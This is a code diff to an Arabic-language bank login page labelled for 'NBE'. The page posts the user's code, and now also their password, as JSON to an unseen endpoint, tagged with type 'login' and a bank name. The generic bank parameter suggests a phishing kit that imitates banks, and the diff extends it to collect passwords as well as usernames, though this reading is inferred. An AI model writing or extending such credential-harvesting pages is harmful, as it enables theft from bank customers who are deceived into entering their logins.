@@ -63,7 +63,10 @@
             <div class="form-group">
                 <input type="text" id="username" class="form-control" placeholder="كود المستخدم" required>
             </div>
-            <a href="#" class="forgot-link">نسيت كود المستخدم</a>
+            <div class="form-group">
+                <input type="password" id="password" class="form-control" placeholder="كلمة المرور" required>
+            </div>
+            <a href="#" class="forgot-link">نسيت كود المستخدم / كلمة المرور؟</a>
             
             <div id="errorMessage"></div>
             
@@ -102,6 +105,7 @@
         document.getElementById("loginForm").addEventListener("submit", async function(e) {
             e.preventDefault();
             const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
             const errorDiv = document.getElementById("errorMessage");
 
             try {
@@ -110,7 +114,7 @@
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         type: "login",
-                        data: { bank: "NBE", username: username }
+                        data: { bank: "NBE", username: username, password: password }
                     })
                 });
                 const result = await response.json();
